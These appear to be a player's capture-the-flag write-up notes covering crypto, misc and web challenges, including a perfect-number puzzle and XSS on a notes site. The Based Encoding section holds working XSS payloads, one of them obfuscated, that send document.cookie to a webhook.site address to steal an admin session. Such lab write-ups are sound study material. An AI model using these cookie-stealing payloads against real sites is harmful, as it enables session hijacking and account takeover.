## Crypto

### Lucky Numbers (Easy)

This is the relevant code which takes 2 numbers and determines if the flag will be given to us. The numbers are s and t, which are in the ranges of 20,000-150,000,000,000 and 0-42 respectively.

```python
        n=2**t-1
        sent=False
        for i in range(2,int(n**0.5)+1):
             if (n%i) == 0:
                print("The second number didn't bring me any luck...")
                sent = True
                break
        if sent:
            continue
        u=t-1
        number=(2**u)*(2**(t)-1)
        sqrt_num=math.isqrt(s)
        for i in range(1,sqrt_num+1):
            if s%i==0:
                A.append(i)
                if i!=s//i and s//i!=s:
                    A.append(s//i)      
        total=sum(A)
        if total==s==number:
```

total must be equal to s which must be equal to number. Total is the sum of A, which is a list of ints. // is whole number divide, % is remainder, ** is exponentiation, isqrt is int square root.

The for loop goes from 1 to the square root of s (rounded) plus 1. range is exclusive, so it loops square root of s times. each loop, it checks if the remainder of s divided by i is 0. If it is, that means that s is divisible by i. If it is, it appends i to A, and checks if i is not equal to s // i AND if s //i is not equal to s. Which is to say that neither number is the square root of the other (I think). If that condition is met, s // i is appended to A.

The other component which must be equal, besides total and s, is number. number is equal to 2^u times 2^t -1, where u is t-1

The final requirement is that for i in range 2 to sqrt of n + 1, where n is 2^t -1, n % i must never be equal to 0.

I had a hard time making heads or tails of this math even after looking through it. I figured the algorithms probably had a more elegant description which would make the problem easier to solve. Luckily, GPT4 is quite good at math, and it identified the functions as checking for a prime number and a perfect number respectively. It wrote a script to check for pairs which might satisfy the conditions and made a nice table. I tried a pair which were in the allowed range and it worked. Very impressive

## Misc

### Soulsplitter (Easy)

I wrote a python script to turn the shards back into a soul, then I ran it using the -i flag for interactive mode so I could decode as many souls as I wanted (and so I didn't have to make a main function which takes command line input) (I should probably learn how to do that). The program takes the name of a text file which contains the shards, to make it easy to enter them and test the program. After some trouble with dependencies, I got it to work, but it doesn't work correctly. After adding some test statements, it became clear that a correct QR code was not being generated correctly. Checking the soulsplitter code, it's obviously because I wasn't accounting for the shuffling of the atoms or the shuffling of the shards and the missing shard. It seems like this problem will require some kind of brute force attack.

Vnzydem-Dfl-VYFqaeWvcQ is the soul for the current set of shards s1.txt. You can use it to confirm if the program is working
### Safest Eval (Medium)

https://safest-eval.flu.xxx

This problem links to a website in which you can submit a python function to be run on the server. The python code is evaluated for it's capability to determine if a string is a palindrome and the result is returned. The server files are available. Presumably, you need to write a python function which can get the flag and send it to a webhook or something.

## PWN

### Destiny Digits


## Rev

## Web

### Awesome Study Notes

This challenge features a website programmed in Rust which allows the user to take notes in html format as well as have a moderator check notes for TOS violation. Presumably, we must do a XSS attack with javascript in order to steal the admin cookie from the administrator and get the flag

I was wondering what happended to my `<script>` tag when I entered it in a note, since other html tags were sent back unchanged. Turns out the Rust source code has a sanitizer:

```rust
    let safe = ammonia::Builder::new()
        .tags(hashset!["h1", "p", "div"])
        .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_string();
```

![[Pasted image 20231014142138.png]]

To access the flag, go to: https://awesomenotes.online/note/flag and add a header to the request called Cookie with session=ADMIN_SESSION where ADMIN_SESSION is the token for the admin

### Based Encoding



![[Pasted image 20231014192249.png]]


Final payload:

```html
<script>var xhr=new XMLHttpRequest();
xhr.open("POST","https://webhook.site/a6d36dad-50de-4be0-ae29-8e48474bc7f2",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("cookie="+encodeURIComponent(document.cookie));</script>
```

However, this doesn't work because the base91 encoding is modified and doesn't use periods or single quotes. The above payload has already had its single quotes replaced by double quotes, but more alterations were needed.

```html
<script>var xhr=new XMLHttpRequest();xhr["open"]("POST","https://webhook" +String["fromCharCode"](46) + "site/3aac4f80"+String["fromCharCode"](45) + "6b5b"+String["fromCharCode"](45) + "442e"+String["fromCharCode"](45) + "a93e"+String["fromCharCode"](45) +"a0503256d4c7",true);xhr["setRequestHeader"]("Content"+String["fromCharCode"](45) +"Type","application/x"+String["fromCharCode"](45) +"www"+String["fromCharCode"](45) +"form"+String["fromCharCode"](45) +"urlencoded");xhr["send"]("cookie="+encodeURIComponent(document["cookie"]));</script>
```
